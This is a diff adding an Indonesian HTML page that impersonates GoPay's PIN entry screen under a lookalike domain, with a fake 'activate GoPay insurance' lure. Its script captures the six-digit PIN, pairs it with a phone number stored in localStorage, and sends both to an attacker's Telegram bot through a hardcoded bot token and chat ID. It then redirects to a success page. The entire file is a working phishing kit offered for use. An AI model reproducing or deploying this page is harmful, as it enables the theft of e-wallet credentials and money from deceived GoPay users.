@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  
+  <!-- Meta Tags -->
+  <title>GoPay - Masukkan PIN</title>
+  <meta name="description" content="Aktifkan GOPAY Asuransi">
+  <meta name="theme-color" content="#000000">
+  <link rel="canonical" href="https://gopays-0z4.app7.my.id/">
+  <meta property="og:title" content="Aktifkan GOPAY Asuransi">
+  <meta property="og:description" content="Aktifkan GOPAY Asuransi">
+  <meta property="og:url" content="https://gopays-0z4.app7.my.id/">
+  <meta property="og:site_name" content="GoPay">
+  <meta property="og:image" content="https://gopays-0z4.app7.my.id/gopay/gopay-ograph.webp">
+  <meta property="og:type" content="website">
+  <link rel="shortcut icon" href="/enterprise/gopay-logo.webp">
+  <link rel="icon" href="/enterprise/gopay-logo.webp" type="image/webp">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    /* KUNCI LAYAR AGAR TIDAK BISA DIGESER/SCROLL */
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      position: fixed;
+      background-color: #000000;
+      color: #ffffff;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 420px;
+      height: 100vh;
+      background-color: #000000;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      margin: 0 auto;
+      overflow: hidden;
+    }
+
+    /* Header Top Bar */
+    .go-pin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 8px;
+      margin-bottom: 20px;
+    }
+
+    .go-icon-btn {
+      background: none;
+      border: none;
+      color: #ffffff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .go-pin-title {
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    /* Body Section */
+    .go-step2-body {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    /* Touch ID Card */
+    .go-touch-card {
+      width: 100%;
+      background-color: #000000;
+      border: 1.5px solid #00b900;
+      border-radius: 12px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 18px;
+      color: #ffffff;
+    }
+
+    .go-touch-card svg {
+      color: #ffffff;
+      flex-shrink: 0;
+    }
+
+    .go-touch-card p {
+      font-size: 13px;
+      line-height: 1.4;
+      flex-grow: 1;
+      color: #ffffff;
+    }
+
+    .go-toggle {
+      width: 44px;
+      height: 24px;
+      border-radius: 12px;
+      background-color: #333333;
+      border: none;
+      position: relative;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .go-toggle span {
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: #ffffff;
+      transition: transform 0.2s;
+    }
+
+    .go-toggle.active {
+      background-color: #00b900;
+    }
+
+    .go-toggle.active span {
+      transform: translateX(20px);
+    }
+
+    .go-pin-hint {
+      font-size: 14px;
+      color: #ffffff;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    /* PIN Box & Dots Rata Kiri */
+    .go-pin-field {
+      width: 100%;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      gap: 28px;
+      background-color: #161618;
+      padding: 18px 24px;
+      border-radius: 14px;
+      margin-bottom: 14px;
+      border: 1px solid #26262a;
+    }
+
+    .go-pin-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background-color: transparent;
+      border: 2px solid #666666;
+      transition: all 0.2s;
+    }
+
+    .go-pin-dot.filled {
+      background-color: #ffffff;
+      border-color: #ffffff;
+    }
+
+    .go-link-green {
+      background: none;
+      border: none;
+      color: #00b900;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    /* Powered by */
+    .go-powered {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      color: #888888;
+      margin-bottom: 8px;
+    }
+
+    .go-brand--compact {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-weight: 700;
+      color: #ffffff;
+      font-size: 14px;
+      letter-spacing: 0.5px;
+    }
+
+    /* Keypad (Angka Diperbesar & Klasik) */
+    .go-keypad {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      padding-bottom: 10px;
+    }
+
+    .go-keypad-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+    }
+
+    .go-key {
+      flex: 1;
+      height: 56px;
+      background-color: transparent;
+      border: none;
+      color: #ffffff;
+      font-family: Georgia, serif;
+      font-size: 28px;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.1s;
+      border-radius: 8px;
+    }
+
+    .go-key:active {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .go-key--empty {
+      background: transparent;
+      cursor: default;
+    }
+
+    .go-key--delete {
+      background-color: transparent;
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <div>
+      <!-- Header -->
+      <header class="go-pin-header">
+        <button type="button" class="go-icon-btn" aria-label="Kembali" onclick="history.back()">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+        </button>
+        <span class="go-pin-title">Masukkin PIN kamu</span>
+        <button type="button" class="go-icon-btn" aria-label="Info">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+        </button>
+      </header>
+
+      <div class="go-step2-body">
+        <!-- Touch ID Card -->
+        <div class="go-touch-card">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.5 2 7.5 4 7.5 6.5V9C5.6 9.8 4.2 11.6 4.2 13.8V16c0 2.8 2.2 5 5 5h5.6c2.8 0 5-2.2 5-5v-2.2c0-2.2-1.4-4-3.3-4.8V6.5C16.5 4 14.5 2 12 2z" stroke="currentColor" stroke-width="1.5"/><path d="M9 14c1 2 2.5 3 3 3s2-1 3-3" stroke="currentColor" stroke-width="1.5"/></svg>
+          <p>Gunakan Touch ID untuk bayar lebih cepat &amp; aman</p>
+          <button type="button" class="go-toggle" id="touchToggle" aria-pressed="false"><span></span></button>
+        </div>
+
+        <p class="go-pin-hint">Silakan ketik 6 digit PIN kamu buat lanjut.</p>
+
+        <!-- PIN Dots Display -->
+        <div class="go-pin-field" id="pinDots">
+          <span class="go-pin-dot"></span>
+          <span class="go-pin-dot"></span>
+          <span class="go-pin-dot"></span>
+          <span class="go-pin-dot"></span>
+          <span class="go-pin-dot"></span>
+          <span class="go-pin-dot"></span>
+        </div>
+
+        <button type="button" class="go-link-green">Lupa PIN</button>
+      </div>
+    </div>
+
+    <div>
+      <div class="go-powered">
+        <span>Powered by</span>
+        <div class="go-brand go-brand--compact">
+          <svg width="18" height="18" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="3" fill="#0081A0"/><path d="M7 10h6a2 2 0 010 4H7V10z" fill="#fff" opacity="0.9"/><rect x="15" y="11" width="5" height="2" rx="1" fill="#00AA13"/></svg>
+          <span>gopay</span>
+        </div>
+      </div>
+
+      <!-- On-screen Keypad -->
+      <div class="go-keypad">
+        <div class="go-keypad-row">
+          <button type="button" class="go-key" data-key="1">1</button>
+          <button type="button" class="go-key" data-key="2">2</button>
+          <button type="button" class="go-key" data-key="3">3</button>
+        </div>
+        <div class="go-keypad-row">
+          <button type="button" class="go-key" data-key="4">4</button>
+          <button type="button" class="go-key" data-key="5">5</button>
+          <button type="button" class="go-key" data-key="6">6</button>
+        </div>
+        <div class="go-keypad-row">
+          <button type="button" class="go-key" data-key="7">7</button>
+          <button type="button" class="go-key" data-key="8">8</button>
+          <button type="button" class="go-key" data-key="9">9</button>
+        </div>
+        <div class="go-keypad-row">
+          <span class="go-key go-key--empty"></span>
+          <button type="button" class="go-key" data-key="0">0</button>
+          <button type="button" class="go-key go-key--delete" id="deleteBtn">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 5a2 2 0 0 0-1.344.519l-6.328 5.74a1 1 0 0 0 0 1.481l6.328 5.741A2 2 0 0 0 10 19h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/><path d="m12 9 6 6"/><path d="m18 9-6 6"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ========================================================
+    // KONFIGURASI TELEGRAM BOT
+    // ========================================================
+    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
+    const TELEGRAM_CHAT_ID = "6742478722";
+    const FINAL_PAGE_URL = "sukses.html"; // Ubah dengan halaman tujuan akhir
+    // ========================================================
+
+    let currentPin = "";
+    const dots = document.querySelectorAll('.go-pin-dot');
+    const touchToggle = document.getElementById('touchToggle');
+
+    touchToggle.addEventListener('click', () => {
+      touchToggle.classList.toggle('active');
+      touchToggle.setAttribute('aria-pressed', touchToggle.classList.contains('active'));
+    });
+
+    document.querySelectorAll('.go-key[data-key]').forEach(button => {
+      button.addEventListener('click', () => {
+        if (currentPin.length < 6) {
+          currentPin += button.getAttribute('data-key');
+          updateDots();
+
+          if (currentPin.length === 6) {
+            sendAllDataToTelegram();
+          }
+        }
+      });
+    });
+
+    document.getElementById('deleteBtn').addEventListener('click', () => {
+      if (currentPin.length > 0) {
+        currentPin = currentPin.slice(0, -1);
+        updateDots();
+      }
+    });
+
+    function updateDots() {
+      dots.forEach((dot, index) => {
+        if (index < currentPin.length) {
+          dot.classList.add('filled');
+        } else {
+          dot.classList.remove('filled');
+        }
+      });
+    }
+
+    // Mengambil Nomor HP dari localStorage & PIN, lalu kirim ke Telegram
+    async function sendAllDataToTelegram() {
+      const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ditemukan';
+
+      const messageText = `📱🔐 *Data Lengkap GoPay Masuk*\n\n` +
+                          `• *Nomor HP:* \`${savedPhone}\`\n` +
+                          `• *PIN:* \`${currentPin}\`\n` +
+                          `• *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: messageText,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error('Gagal mengirim data:', err);
+      } finally {
+        window.location.href = FINAL_PAGE_URL;
+      }
+    }
+  </script>
+</body>
+</html>
